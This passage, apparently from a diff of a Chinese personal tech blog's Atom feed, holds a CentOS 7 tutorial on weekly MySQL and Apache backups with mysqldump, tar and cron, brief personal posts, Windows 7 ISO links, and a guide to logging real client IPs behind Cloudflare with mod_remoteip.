class="line"><span class="comment"># CONFIGURATION_DIRECTORY-&gt;配置目录</span></span><br><span class="line"><span class="comment"># STORAGE_PATH-&gt;存储路径</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export DATE=$(date +%F-%H-%M)&#x27;</span> &gt; /home/$(<span class="built_in">whoami</span>)/backup/.env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export MYSQL_USERNAME=&#x27;root&#x27;&quot;</span> &gt;&gt; /home/$(<span class="built_in">whoami</span>)/backup/.env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export MYSQL_PASSWORD=&#x27;root&#x27;&quot;</span> &gt;&gt; /home/$(<span class="built_in">whoami</span>)/backup/.env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export DATABASE_NAME=&#x27;example_db&#x27;&quot;</span> &gt;&gt; /home/$(<span class="built_in">whoami</span>)/backup/.env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export WEB_DIRECTORY=&#x27;/var/www&#x27;&quot;</span> &gt;&gt; /home/$(<span class="built_in">whoami</span>)/backup/.env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export CONFIGURATION_DIRECTORY=&#x27;/etc/httpd&#x27;&quot;</span> &gt;&gt; /home/$(<span class="built_in">whoami</span>)/backup/.env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export STORAGE_PATH=&#x27;/home/<span class="subst">$(whoami)</span>/backup&#x27;&quot;</span> &gt;&gt; /home/$(<span class="built_in">whoami</span>)/backup/.env</span><br></pre></td></tr></table></figure><h2 id="执行备份"><a href="#执行备份" class="headerlink" title="执行备份"></a>执行备份</h2><p>在 <code>backup</code> 目录创建 <code>web_server_backup.sh</code> 脚本并将下面的代码粘贴到脚本中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份数据库</span></span><br><span class="line">backup_database()</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;*** Backup database ‘$DATABASE_NAME’ as ‘$STORAGE_PATH/$&#123;DATABASE_NAME&#125;_backup-$DATE.sql’ ***&quot; &gt; $STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.log</span><br><span class="line">  mysqldump -u $MYSQL_USERNAME -p$MYSQL_PASSWORD $DATABASE_NAME &gt; $STORAGE_PATH/$&#123;DATABASE_NAME&#125;_backup-$DATE.sql</span><br><span class="line">  if [ -e $STORAGE_PATH/$&#123;DATABASE_NAME&#125;_backup-$DATE.sql ]; then</span><br><span class="line">    echo &#x27;info: Backup database successfully!&#x27; &gt;&gt; $STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.log</span><br><span class="line">  else</span><br><span class="line">    echo &#x27;error: Failed to backup database.&#x27; &gt;&gt; $STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.log</span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份文件</span></span><br><span class="line">backup_file()</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;*** Backup directory ‘$WEB_DIRECTORY’ as ‘$STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.tar.gz’ ***&quot; &gt;&gt; $STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.log</span><br><span class="line">  tar -C $&#123;WEB_DIRECTORY%/*&#125; -czpvf $STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.tar.gz $&#123;WEB_DIRECTORY##*/&#125; &gt;&gt; $STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.log</span><br><span class="line">  echo &quot;*** Backup directory ‘$CONFIGURATION_DIRECTORY’ as ‘$STORAGE_PATH/$&#123;CONFIGURATION_DIRECTORY##*/&#125;_backup-$DATE.tar.gz’ ***&quot; &gt;&gt; $STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.log</span><br><span class="line">  tar -C $&#123;CONFIGURATION_DIRECTORY%/*&#125; -czpvf $STORAGE_PATH/$&#123;CONFIGURATION_DIRECTORY##*/&#125;_backup-$DATE.tar.gz $&#123;CONFIGURATION_DIRECTORY##*/&#125; &gt;&gt; $STORAGE_PATH/$&#123;WEB_DIRECTORY##*/&#125;_backup-$DATE.log</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取备份信息</span></span><br><span class="line">source $1</span><br><span class="line"></span><br><span class="line">backup_database</span><br><span class="line">backup_file</span><br></pre></td></tr></table></figure><p>执行备份，其过程中生成的日志将与备份文件保存在相同的目录中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash web_server_backup.sh /home/$(<span class="built_in">whoami</span>)/backup/.env</span><br></pre></td></tr></table></figure><h2 id="使用-Cron-自动化"><a href="#使用-Cron-自动化" class="headerlink" title="使用 Cron 自动化"></a>使用 Cron 自动化</h2><p>编辑 crontab。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>添加以下定时任务，该任务将会在每周星期一到时自动执行备份脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 * * 1 /usr/bin/env bash /home/$(whoami)/backup/web_server_backup.sh /home/$(whoami)/backup/.env</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;以下的内容是在 CentOS 7 上进行的（其他 Linux 发行版应该也没什么问题;D），主要介绍怎样使用 mysqldump 和 Tar 结合 Cron 自动备份数据库、Apache 的配置目录及文档根目录。本文示例的备份周期为每周备份1次。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="系统运维" scheme="https://blog.iambug.cn/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
+    
+    
+    <category term="CentOS" scheme="https://blog.iambug.cn/tags/CentOS/"/>
+    
+    <category term="Apache" scheme="https://blog.iambug.cn/tags/Apache/"/>
+    
+    <category term="MySQL" scheme="https://blog.iambug.cn/tags/MySQL/"/>
+    
+    <category term="Cron" scheme="https://blog.iambug.cn/tags/Cron/"/>
+    
+    <category term="Shell" scheme="https://blog.iambug.cn/tags/Shell/"/>
+    
+    <category term="Tar" scheme="https://blog.iambug.cn/tags/Tar/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一个留言，在冬天</title>
+    <link href="https://blog.iambug.cn/articles/27465.html"/>
+    <id>https://blog.iambug.cn/articles/27465.html</id>
+    <published>2020-12-19T08:08:00.000Z</published>
+    <updated>2021-01-17T10:17:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/2020-12-19/img-1.jpg"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/2020-12-19/img-1.jpg&quot;&gt;&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="闲言碎语" scheme="https://blog.iambug.cn/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
+    
+    
+    <category term="海之言" scheme="https://blog.iambug.cn/tags/%E6%B5%B7%E4%B9%8B%E8%A8%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>海之言</title>
+    <link href="https://blog.iambug.cn/articles/43953.html"/>
+    <id>https://blog.iambug.cn/articles/43953.html</id>
+    <published>2020-12-01T12:10:00.000Z</published>
+    <updated>2022-04-08T13:59:00.053Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>糖，是甜的~</strong><br>2020-12-01 20:11</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;糖，是甜的~&lt;/strong&gt;&lt;br&gt;2020-12-01 20:11&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="闲言碎语" scheme="https://blog.iambug.cn/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
+    
+    
+    <category term="海之言" scheme="https://blog.iambug.cn/tags/%E6%B5%B7%E4%B9%8B%E8%A8%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows 7 光盘映像（ISO 文件）</title>
+    <link href="https://blog.iambug.cn/articles/56536.html"/>
+    <id>https://blog.iambug.cn/articles/56536.html</id>
+    <published>2020-11-22T01:11:00.000Z</published>
+    <updated>2020-12-03T13:41:58.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>Windows 7 旗舰版（32位）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://download.msdn.microsoft.com/pr/cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso</span><br></pre></td></tr></table></figure><span id="more"></span><p><strong>Windows 7 旗舰版（64位）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://download.msdn.microsoft.com/pr/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;&lt;strong&gt;Windows 7 旗舰版（32位）&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://download.msdn.microsoft.com/pr/cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="资源共享" scheme="https://blog.iambug.cn/categories/%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB/"/>
+    
+    
+    <category term="Windows" scheme="https://blog.iambug.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何从 Cloudflare 获取真实客户端 IP？</title>
+    <link href="https://blog.iambug.cn/articles/56007.html"/>
+    <id>https://blog.iambug.cn/articles/56007.html</id>
+    <published>2020-11-18T13:44:00.000Z</published>
+    <updated>2021-04-27T23:54:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>Cloudflare 可以为网站提供免费的 CDN 和 DDoS 防护，但在使用时 Apache 获取到的 IP 地址将是 Cloudflare 的，而不是访问者的真实客户端 IP。如果希望在 Web 服务器的日志中记录真实客户端 IP 或者根据 IP 进行访问控制的配置，则可以使用 <code>mod_remoteip</code> 模块来获取真实客户端 IP，本文将在 CentOS 7上完成这一个过程。</p><span id="more"></span><h2 id="启用-mod-remoteip-模块"><a href="#启用-mod-remoteip-模块" class="headerlink" title="启用 mod_remoteip 模块"></a>启用 mod_remoteip 模块</h2><p>Apache 2.4.6默认已经包含了 <code>mod_remoteip</code> 模块，打开 <code>/etc/httpd/conf/httpd.conf</code> 配置文件，添加以下配置即可加载 <code>mod_remoteip</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule remoteip_module modules/mod_remoteip.so</span><br></pre></td></tr></table></figure><h2 id="定义可信代理地址"><a href="#定义可信代理地址" class="headerlink" title="定义可信代理地址"></a>定义可信代理地址</h2><p>新建 <code>/etc/httpd/conf.d/remoteip.conf</code> 文件，包含 <code>RemoteIPHeader CF-Connecting-IP</code>，然后再添加可信代理地址，在 Cloudflare 已经给出了其当前 IP 范围的 <a href="https://www.cloudflare.com/ips-v4">IPv4</a> 和 <a href="https://www.cloudflare.com/ips-v6">IPv6</a> 列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">RemoteIPHeader CF-Connecting-IP</span><br><span class="line">RemoteIPTrustedProxy 173.245.48.0/20</span><br><span class="line">RemoteIPTrustedProxy 103.21.244.0/22</span><br><span class="line">RemoteIPTrustedProxy 103.22.200.0/22</span><br><span class="line">RemoteIPTrustedProxy 103.31.4.0/22</span><br><span class="line">RemoteIPTrustedProxy 141.101.64.0/18</span><br><span class="line">RemoteIPTrustedProxy 108.162.192.0/18</span><br><span class="line">RemoteIPTrustedProxy 190.93.240.0/20</span><br><span class="line">RemoteIPTrustedProxy 188.114.96.0/20</span><br><span class="line">RemoteIPTrustedProxy 197.234.240.0/22</span><br><span class="line">RemoteIPTrustedProxy 198.41.128.0/17</span><br><span class="line">RemoteIPTrustedProxy 162.158.0.0/15</span><br><span class="line">RemoteIPTrustedProxy 172.64.0.0/13</span><br><span class="line">RemoteIPTrustedProxy 131.0.72.0/22</span><br><span class="line">RemoteIPTrustedProxy 104.16.0.0/13</span><br><span class="line">RemoteIPTrustedProxy 104.24.0.0/14</span><br><span class="line">RemoteIPTrustedProxy 2400:cb00::/32</span><br><span class="line">RemoteIPTrustedProxy 2606:4700::/32</span><br><span class="line">RemoteIPTrustedProxy 2803:f800::/32</span><br><span class="line">RemoteIPTrustedProxy 2405:b500::/32</span><br><span class="line">RemoteIPTrustedProxy 2405:8100::/32</span><br><span class="line">RemoteIPTrustedProxy 2a06:98c0::/29</span><br><span class="line">RemoteIPTrustedProxy 2c0f:f248::/32</span><br></pre></td></tr></table></figure><h2 id="自定义日志格式"><a href="#自定义日志格式" class="headerlink" title="自定义日志格式"></a>自定义日志格式</h2><p>打开 <code>/etc/httpd/conf/httpd.conf</code> 文件，默认的日志格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</span><br><span class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common</span><br><span class="line"></span><br><span class="line">&lt;IfModule logio_module&gt;</span><br><span class="line">  # You need to enable mod_logio.c to use %I and %O</span><br><span class="line">  LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot; %I %O&quot; combinedio</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>如果在日志中记录真实客户端 IP 就将远程主机 IP <code>%h</code> 替换为访问的客户端 IP <code>%a</code>。如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LogFormat &quot;%a %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</span><br><span class="line">LogFormat &quot;%a %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common</span><br><span class="line"></span><br><span class="line">&lt;IfModule logio_module&gt;</span><br><span class="line">  # You need to enable mod_logio.c to use %I and %O</span><br><span class="line">  LogFormat &quot;%a %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot; %I %O&quot; combinedio</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;Cloudflare 可以为网站提供免费的 CDN 和 DDoS 防护，但在使用时 Apache 获取到的 IP 地址将是 Cloudflare 的，而不是访问者的真实客户端 IP。如果希望在 Web 服务器的日志中记录真实客户端 IP 或者根据 IP 进行访问控制的配置，则可以使用 &lt;code&gt;mod_remoteip&lt;/code&gt; 模块来获取真实客户端 IP，本文将在 CentOS 7上完成这一个过程。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="网络日志" scheme="https://blog.iambug.cn/categories/%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/"/>
+    
+    
+    <category term="CDN" scheme="https://blog.iambug.cn/tags/CDN/"/>
+    
+    <category term="DDoS" scheme="https://blog.iambug.cn/tags/DDoS/"/>
+    
+  </entry>
+  
+</feed>
